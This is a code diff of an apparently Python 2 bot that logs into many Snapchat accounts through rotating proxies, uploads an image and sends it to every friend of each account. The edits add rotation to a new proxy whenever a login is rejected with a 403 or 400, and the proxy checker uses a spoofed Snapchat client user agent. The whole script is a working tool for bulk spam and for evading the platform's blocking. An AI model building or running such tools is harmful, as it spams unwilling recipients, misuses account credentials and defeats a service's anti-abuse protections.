@@ -67,8 +67,10 @@ def oneThread(inp):
                 if s not in result:
                     num = process(proxy, auth)
                     fff = open("output.txt", "a")
-                    if num == 0:
-                        # break, --
+                    if num == "prox":
+                        break
+                        # bad proxy
+                    elif num == 0:
                         result[s] = "#error"
                         print s + " #error"
                         fff.write(s + " #error\n")
@@ -88,7 +90,7 @@ def oneThread(inp):
 # start new thread with a pack of users, for ex: 100 users -> 5 threads with 20 users
 def process(prox, auth):
     num = 0 #num of successfully processed snaps 
-    prox = {"http": "http://"+prox}
+    prox = {"https": "https://"+prox}
 
     try:
         s = Snapchat()
@@ -96,9 +98,15 @@ def process(prox, auth):
 
         # try login, if 403 - return "rotate proxy"
         login = s.login(auth["user"], auth["pass"])
+        #print "(login)", login
 
+        try:
+            if login['status'] == 403 or login['status'] == 400:
+                return "prox"
+        except:
+            pass
         
-        print login 
+        
         # upload pic for curr account
         media_id = s.upload(imagename)
         #print "media_id", media_id
@@ -106,6 +114,7 @@ def process(prox, auth):
         recipients = ""
         for friend in login["friends"]:
             recipients += friend["name"] + ","
+            
 
         #print "\nrecipients:", recipients
         try:
@@ -202,11 +211,11 @@ def prepair():
 def is_bad_proxy(pip):
     socket.setdefaulttimeout(7)
     try:        
-        proxy_handler = urllib2.ProxyHandler({'http': pip})        
+        proxy_handler = urllib2.ProxyHandler({'https': pip})        
         opener = urllib2.build_opener(proxy_handler)
         opener.addheaders = [('User-agent', 'Snapchat/4.1.01 (Nexus 4; Android 18; gzip)')]
         urllib2.install_opener(opener)        
-        req=urllib2.Request('http://google.com')#https://feelinsonice.appspot.com/bq/')
+        req=urllib2.Request('https://google.com')#https://feelinsonice.appspot.com/bq/')
         sock=urllib2.urlopen(req)
     except urllib2.HTTPError, e:        
         return True 
